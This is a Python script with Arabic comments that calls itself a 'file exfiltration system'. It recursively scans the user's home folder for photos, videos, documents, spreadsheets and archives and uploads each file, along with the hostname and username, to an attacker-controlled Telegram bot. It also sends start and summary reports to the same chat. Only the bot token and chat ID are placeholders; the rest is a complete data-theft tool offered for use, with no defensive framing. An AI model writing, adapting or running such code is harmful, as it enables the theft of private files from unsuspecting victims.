#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import requests
import sys
from pathlib import Path
import platform
import socket

# ============= إعدادات تلجرام (IMPORTANT: ضع توكينك هنا) =============
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # استبدل هذا بتوكين البوت الخاص بك
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"      # استبدل هذا بـ Chat ID الخاص بك

# ============= إعدادات المسح =============
root_path = os.path.expanduser("~")
extensions = ('.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.docx', '.txt', '.doc', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar', '.7z', '.gif', '.bmp', '.wav', '.mp3')

# ============= معلومات الجهاز =============
def get_device_info():
    """الحصول على معلومات الجهاز"""
    try:
        device_name = socket.gethostname()
        system = platform.system()
        user = os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
        return f"{system} | {device_name} | User: {user}"
    except:
        return "Unknown Device"

# ============= دالة إرسال الملفات عبر تلجرام =============
def send_file_to_telegram(file_path, original_path):
    """إرسال ملف إلى تلجرام"""
    try:
        if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
            return False, "❌ توكين البوت غير مضبوط"
        
        if not TELEGRAM_CHAT_ID or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
            return False, "❌ Chat ID غير مضبوط"
        
        file_size = os.path.getsize(file_path)
        
        # تلجرام يدعم ملفات حتى 50 MB
        if file_size > 50 * 1024 * 1024:
            return False, f"⏭️  الملف كبير جداً ({file_size / 1024 / 1024:.2f} MB)"
        
        # إرسال الملف
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        
        with open(file_path, 'rb') as f:
            files = {'document': f}
            caption = f"""
📁 **ملف مسحوب جديد**

📄 **الملف:** {os.path.basename(file_path)}
📍 **المسار الأصلي:** {original_path}
💾 **الحجم:** {file_size / 1024:.2f} KB
🖥️ **الجهاز:** {get_device_info()}
⏰ **الوقت:** {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': caption,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, files=files, data=data, timeout=60)
            
            if response.status_code == 200:
                return True, "✅ تم الإرسال"
            else:
                return False, f"❌ فشل الإرسال (Status: {response.status_code})"
    
    except Exception as e:
        return False, f"❌ خطأ: {str(e)}"

# ============= دالة إرسال رسالة نصية =============
def send_message_to_telegram(message):
    """إرسال رسالة نصية إلى تلجرام"""
    try:
        if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
            return False
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        response = requests.post(url, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

# ============= البرنامج الرئيسي =============
print("-" * 60)
print("⚡ RASHD_AI: FILE EXFILTRATION SYSTEM STARTED ⚡")
print("-" * 60)
print(f"🔍 Scanning: {root_path}")
print(f"📁 Looking for: {', '.join(extensions)}")
print(f"🖥️ Device: {get_device_info()}")
print("-" * 60)

# إرسال إشعار البدء إلى تلجرام
startup_msg = f"""
🚀 **نظام سحب الملفات قد بدأ العمل**

🖥️ **الجهاز:** {get_device_info()}
📂 **المجلد المراقب:** {root_path}
⏰ **الوقت:** {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

جاري البحث عن الملفات...
"""
send_message_to_telegram(startup_msg)

# ============= مسح وتحميل الملفات =============
count = 0
failed = 0
total_size = 0

try:
    for root, dirs, files in os.walk(root_path):
        # تخطي المجلدات الحساسة
        skip_dirs = ['.git', '.venv', '__pycache__', 'node_modules', '.cache', 'AppData', 'Library', 'System Volume Information', '$Recycle.Bin']
        dirs[:] = [d for d in dirs if d not in skip_dirs]
        
        for file in files:
            if file.lower().endswith(extensions):
                file_path = os.path.join(root, file)
                
                try:
                    # الحصول على حجم الملف
                    file_size = os.path.getsize(file_path)
                    
                    # تخطي الملفات الكبيرة جداً (أكثر من 50 MB)
                    if file_size > 50 * 1024 * 1024:
                        print(f"⏭️  SKIPPED (Too Large): {file} ({file_size / 1024 / 1024:.2f} MB)")
                        continue
                    
                    print(f"[+] PROCESSING: {file} ({file_size / 1024:.2f} KB)")
                    
                    # إرسال الملف إلى تلجرام
                    success, message = send_file_to_telegram(file_path, file_path)
                    
                    if success:
                        print(f"✅ UPLOADED: {file}")
                        count += 1
                        total_size += file_size
                    else:
                        print(f"❌ FAILED: {file} - {message}")
                        failed += 1
                
                except PermissionError:
                    print(f"🔒 PERMISSION DENIED: {file}")
                    failed += 1
                except Exception as e:
                    print(f"⚠️  ERROR: {file} - {str(e)}")
                    failed += 1

except KeyboardInterrupt:
    print("\n⚠️  INTERRUPTED BY USER")
except Exception as e:
    print(f"❌ CRITICAL ERROR: {str(e)}")

# ============= الملخص النهائي =============
print("-" * 60)
print(f"⚡ MISSION COMPLETE ⚡")
print(f"✅ UPLOADED: {count} files")
print(f"❌ FAILED: {failed} files")
print(f"📊 Total Size: {total_size / 1024 / 1024:.2f} MB")
print("-" * 60)

# إرسال ملخص نهائي إلى تلجرام
summary_msg = f"""
✅ **انتهى سحب الملفات**

📊 **الإحصائيات:**
✅ تم تحميل: {count} ملفات
❌ فشل: {failed} ملفات
💾 الحجم الإجمالي: {total_size / 1024 / 1024:.2f} MB

🖥️ **الجهاز:** {get_device_info()}
⏰ **الوقت:** {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
send_message_to_telegram(summary_msg)

# إغلاق البرنامج بهدوء
sys.exit(0)
